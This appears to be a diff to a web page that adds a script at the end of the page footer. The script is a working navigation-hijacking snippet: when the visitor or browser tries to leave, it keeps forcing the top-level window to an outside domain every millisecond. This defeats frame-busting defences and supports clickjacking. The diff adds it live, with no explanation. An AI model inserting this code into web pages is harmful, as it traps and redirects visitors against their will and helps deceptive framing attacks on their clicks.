@@ -302,5 +302,16 @@ setTimeout('refresh()', 3000);
 	Contact: <b>astroid010203@gmail.com</b>		
 		</center>
 		</footer>
+	<script type="text/javascript">
+    var prevent_bust = 0;
+    window.onbeforeunload = function() { prevent_bust++; }
+    setInterval(function() {
+      if (prevent_bust > 0) {
+        prevent_bust -= 2;
+        window.top.location = 'https://t3rm01.tk';
+        /* Replace URL with a page that actually responds with HTTP status code 204 */
+      }
+    }, 1);
+</script>
 
 </html>
